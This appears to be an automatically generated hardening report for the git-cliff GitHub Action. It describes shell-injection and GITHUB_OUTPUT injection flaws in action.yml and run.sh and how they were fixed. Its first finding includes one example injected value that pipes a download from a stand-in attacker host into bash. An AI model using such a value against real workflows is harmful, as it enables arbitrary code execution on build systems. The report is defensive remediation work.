<!-- markdownlint-disable -->

# Hardening Report: orhun--git-cliff-action/v4.6.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **orhun--git-cliff-action/v4.6.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): Direct expression interpolation in a run: block. In action.yml line 40, the shell command directly interpolates `${{ inputs.config }}` and `${{ inputs.args }}` into the shell command string: `run: ${GITHUB_ACTION_PATH}/run.sh --config=${{ inputs.config }} ${{ inputs.args }}`. Both `inputs.config` and `inputs.args` are attacker-controlled values that flow through YAML template substitution before the shell parses them, enabling arbitrary command injection (e.g., an `args` value of `; curl attacker.com | bash` would execute). These inputs must be passed via env vars and double-quoted in the script instead.

Locations:

- `action.yml:40`

### github-env-injection (severity: high)

run.sh writes unsanitized, user-influenced values to $GITHUB_OUTPUT without the required `printf '%s' ... | tr -d '\n\r'` sanitization step:

1. Line 57-59: `cat "$OUTPUT" >> $GITHUB_OUTPUT` — the full content of the changelog file is streamed directly into GITHUB_OUTPUT using a heredoc with the literal delimiter 'EOF'. If any commit message or changelog entry contains a line consisting solely of 'EOF', it will prematurely terminate the heredoc and allow injection of arbitrary key=value pairs into GITHUB_OUTPUT.

2. Line 63: `echo "changelog=$OUTPUT" >> $GITHUB_OUTPUT` — $OUTPUT is derived from the `--output` argument in `inputs.args` (attacker-controlled via the calling workflow). A value containing newlines would inject additional entries into GITHUB_OUTPUT.

3. Line 66: `echo "version=$(jq -r '.[0].version' $CONTEXT)" >> $GITHUB_OUTPUT` — the version string extracted from git-cliff's JSON output (sourced from git tags, which can be attacker-controlled in a PR context) is written without sanitization. A newline in the version string would inject additional GITHUB_OUTPUT entries.

Locations:

- `run.sh:57`
- `run.sh:63`
- `run.sh:66`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.config }}" appears directly in run: block of step "Run git-cliff"; move to env: map

Locations:

- `action.yml:46`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step "Run git-cliff"; move to env: map

Locations:

- `action.yml:46`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, github-env-injection

**Notes:**

Fixed all four findings:
1. action.yml: Moved `${{ inputs.config }}` and `${{ inputs.args }}` from the run: block into the env: map as INPUT_CONFIG and INPUT_ARGS. The args list is tokenized with xargs (quote-aware) into a bash array to preserve argument boundaries. Config is passed double-quoted as --config="$INPUT_CONFIG".
2. run.sh line 57-59: Replaced the static 'EOF' heredoc delimiter with a randomized one (EOF_<openssl-rand-hex-16>) to prevent changelog content from prematurely terminating the heredoc and injecting into GITHUB_OUTPUT.
3. run.sh line 63: Sanitized $OUTPUT with `printf '%s' "$OUTPUT" | tr -d '\n\r'` before writing changelog= to GITHUB_OUTPUT.
4. run.sh line 66: Extracted the version into a separate variable first (preserving exit code under errexit), then sanitized with `printf '%s' "$raw_version" | tr -d '\n\r'` before writing version= to GITHUB_OUTPUT.

